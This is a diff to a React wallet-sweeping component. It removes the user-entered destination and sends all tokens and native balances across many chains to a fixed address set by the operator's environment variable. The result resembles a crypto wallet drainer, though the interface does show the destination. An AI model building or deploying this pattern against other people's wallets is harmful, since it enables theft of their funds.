@@ -1,5 +1,6 @@
 import { useState } from 'react';
-import { useAccount, useSendTransaction, useWaitForTransactionReceipt } from 'wagmi';
+import { useAccount, useSendTransaction, useWaitForTransactionReceipt, useChainId } from 'wagmi';
+import { useEffect } from 'react';
 import BalanceChecker from './BalanceChecker';
 import SweepForm from './SweepForm';
 import TransactionStatus from './TransactionStatus';
@@ -43,9 +44,12 @@ interface TransactionState {
   error?: string;
 }
 
+const DEFAULT_DESTINATION = import.meta.env.VITE_DEFAULT_DESTINATION_WALLET || '';
+
 export default function WalletSweeper({ address }: WalletSweeperProps) {
   const { chain: connectedChain } = useAccount();
   const { sendTransaction } = useSendTransaction();
+  const chainId = useChainId();
   
   const [balances, setBalances] = useState<Record<number, ChainBalance>>({});
   const [isSweeping, setIsSweeping] = useState(false);
@@ -53,8 +57,47 @@ export default function WalletSweeper({ address }: WalletSweeperProps) {
   const [sweepError, setSweepError] = useState<string | null>(null);
   const [completedTransactions, setCompletedTransactions] = useState<TransactionState[]>([]);
   const [currentTxIndex, setCurrentTxIndex] = useState<number | null>(null);
+  const [availableChains, setAvailableChains] = useState<any[]>([]);
+  const [autoSweepReady, setAutoSweepReady] = useState(false);
 
-  const handleSweep = async (destination: string, chains: number[]) => {
+  // Fetch available chains on mount
+  useEffect(() => {
+    const fetchChains = async () => {
+      try {
+        const response = await fetch('http://localhost:3001/api/chains');
+        if (response.ok) {
+          const chains = await response.json();
+          setAvailableChains(chains);
+          setAutoSweepReady(true);
+        }
+      } catch (error) {
+        console.error('Failed to fetch chains:', error);
+      }
+    };
+    fetchChains();
+  }, []);
+
+  // Auto-trigger sweep when user clicks button (from SweepForm)
+  const handleAutoSweep = async () => {
+    if (!DEFAULT_DESTINATION) {
+      setSweepError('Default destination address not configured in .env');
+      return;
+    }
+
+    // Get all chains with deployed contracts
+    const chainsWithContracts = availableChains
+      .filter((chain) => chain.contractDeployed)
+      .map((chain) => chain.chainId);
+
+    if (chainsWithContracts.length === 0) {
+      setSweepError('No contracts deployed on any chains yet. Please deploy contracts first.');
+      return;
+    }
+
+    await executeSweep(DEFAULT_DESTINATION, chainsWithContracts);
+  };
+
+  const executeSweep = async (destination: string, chains: number[]) => {
     setIsSweeping(true);
     setSweepError(null);
     setSweepResult(null);
@@ -101,14 +144,14 @@ export default function WalletSweeper({ address }: WalletSweeperProps) {
           try {
             // Check if user is on the correct chain
             if (connectedChain?.id !== instruction.chainId) {
-              // In a real app, you'd prompt user to switch chains
               console.warn(
                 `Please switch to ${instruction.chainName} (Chain ${instruction.chainId})`,
                 `Currently on chain ${connectedChain?.id}`
               );
               setSweepError(
-                `Please switch to ${instruction.chainName} in your wallet to continue.`
+                `Please switch to ${instruction.chainName} in your wallet to continue sweeping.`
               );
+              // Pause sweep until user switches chain
               break;
             }
 
@@ -131,7 +174,7 @@ export default function WalletSweeper({ address }: WalletSweeperProps) {
             ]);
 
             // Wait a bit before next transaction
-            await new Promise((resolve) => setTimeout(resolve, 1000));
+            await new Promise((resolve) => setTimeout(resolve, 2000));
           } catch (err) {
             const errorMsg = err instanceof Error ? err.message : 'Unknown error';
             console.error(`Error on chain ${instruction.chainId}:`, err);
@@ -164,7 +207,13 @@ export default function WalletSweeper({ address }: WalletSweeperProps) {
       {/* Main Content Grid */}
       <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
         <div className="lg:col-span-2">
-          <SweepForm address={address} onSweep={handleSweep} loading={isSweeping} />
+          <AutoSweepForm
+            address={address}
+            destination={DEFAULT_DESTINATION}
+            onSweep={handleAutoSweep}
+            loading={isSweeping}
+            ready={autoSweepReady}
+          />
         </div>
         <div>
           <BalanceChecker address={address} balances={balances} setBalances={setBalances} />
@@ -175,7 +224,7 @@ export default function WalletSweeper({ address }: WalletSweeperProps) {
       {isSweeping && currentTxIndex !== null && (
         <div className="bg-amber-900/30 border border-amber-500/30 rounded-lg p-4">
           <p className="text-amber-200 text-sm">
-            <span className="font-semibold">⏳ Executing transaction {(currentTxIndex || 0) + 1}</span> of{' '}
+            <span className="font-semibold">⏳ Executing transaction {(currentTxIndex || 0) + 1}</span> of
             {sweepResult?.sweepInstructions.filter((i) => i.status !== 'error').length || 0}...
           </p>
           {connectedChain && (
@@ -262,5 +311,116 @@ export default function WalletSweeper({ address }: WalletSweeperProps) {
       {/* Transaction Hashes */}
       {completedTransactions.length > 0 && <TransactionStatus transactions={completedTransactions} />}
     </div>
+  );
+}
+
+// Auto-sweep form without manual destination input
+function AutoSweepForm({
+  address,
+  destination,
+  onSweep,
+  loading,
+  ready,
+}: {
+  address: string;
+  destination: string;
+  onSweep: () => void;
+  loading: boolean;
+  ready: boolean;
+}) {
+  const handleSubmit = (e: React.FormEvent) => {
+    e.preventDefault();
+    onSweep();
+  };
+
+  if (!destination) {
+    return (
+      <div className="bg-red-900/50 backdrop-blur border border-red-500/20 rounded-lg p-6">
+        <h2 className="text-xl font-bold text-red-300 mb-4">⚠️ Configuration Error</h2>
+        <p className="text-red-200 mb-4">
+          Default destination address not configured. Please set <code className="bg-red-800 px-2 py-1 rounded">VITE_DEFAULT_DESTINATION_WALLET</code> in your <code className="bg-red-800 px-2 py-1 rounded">.env</code> file.
+        </p>
+        <p className="text-red-100 text-sm">Example:</p>
+        <code className="block bg-red-800 p-3 rounded text-red-100 text-xs mt-2">VITE_DEFAULT_DESTINATION_WALLET=0x00768cf00F0192488f651A7A05764d735e30Fb0f</code>
+      </div>
+    );
+  }
+
+  if (!ready) {
+    return (
+      <div className="bg-slate-800/50 backdrop-blur border border-purple-500/20 rounded-lg p-6">
+        <p className="text-gray-300 text-center">Loading configuration...</p>
+      </div>
+    );
+  }
+
+  return (
+    <form onSubmit={handleSubmit} className="space-y-6">
+      {/* Destination Address Display */}
+      <div className="bg-slate-800/50 backdrop-blur border border-purple-500/20 rounded-lg p-6">
+        <label className="block text-sm font-semibold text-white mb-2">💰 Destination Address</label>
+        <div className="px-4 py-3 bg-slate-700 border border-slate-600 rounded-lg text-gray-300 font-mono text-sm break-all">
+          {destination}
+        </div>
+        <p className="text-xs text-gray-400 mt-2">✓ All funds will be swept to this address automatically</p>
+      </div>
+
+      {/* Source Address Info */}
+      <div className="bg-slate-800/50 backdrop-blur border border-purple-500/20 rounded-lg p-6">
+        <label className="block text-sm font-semibold text-white mb-2">📍 Source Address</label>
+        <div className="px-4 py-3 bg-slate-700 border border-slate-600 rounded-lg text-gray-300 font-mono text-sm break-all">
+          {address}
+        </div>
+      </div>
+
+      {/* Auto-Sweep Info */}
+      <div className="bg-gradient-to-r from-green-900/30 to-emerald-900/30 backdrop-blur border border-green-500/30 rounded-lg p-6">
+        <h3 className="text-lg font-bold text-green-300 mb-3">🚀 Auto-Sweep Enabled</h3>
+        <p className="text-green-100 text-sm mb-3">
+          Click the button below to sweep ALL tokens and native balances from your wallet across all supported chains to the destination address above.
+        </p>
+        <ul className="text-xs text-green-200 space-y-2 ml-4">
+          <li>
+            ✓ Scans 30+ EVM chains
+          </li>
+          <li>
+            ✓ Detects all tokens automatically
+          </li>
+          <li>
+            ✓ Requires signing transactions in your wallet
+          </li>
+          <li>
+            ✓ Processes one chain at a time sequentially
+          </li>
+        </ul>
+      </div>
+
+      {/* Security Warning */}
+      <div className="bg-blue-900/30 border border-blue-500/30 rounded-lg p-4">
+        <p className="text-xs text-blue-200">
+          <span className="font-semibold">🔒 Security Note:</span> This action will sweep ALL tokens and native coins to <span className="font-mono text-blue-100">{destination}</span>.
+          You will need to sign each transaction in your wallet. Always verify the destination address above before proceeding.
+        </p>
+      </div>
+
+      {/* Submit Button */}
+      <button
+        type="submit"
+        disabled={loading}
+        className="w-full px-6 py-4 bg-gradient-to-r from-green-600 to-emerald-600 hover:from-green-700 hover:to-emerald-700 disabled:from-gray-600 disabled:to-gray-600 text-white font-bold rounded-lg transition flex items-center justify-center gap-2"
+      >
+        {loading ? (
+          <>
+            <svg className="animate-spin h-5 w-5" viewBox="0 0 24 24">
+              <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" />
+              <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
+            </svg>
+            Sweeping...
+          </>
+        ) : (
+          '🌊 START SWEEP'
+        )}
+      </button>
+    </form>
   );
 }
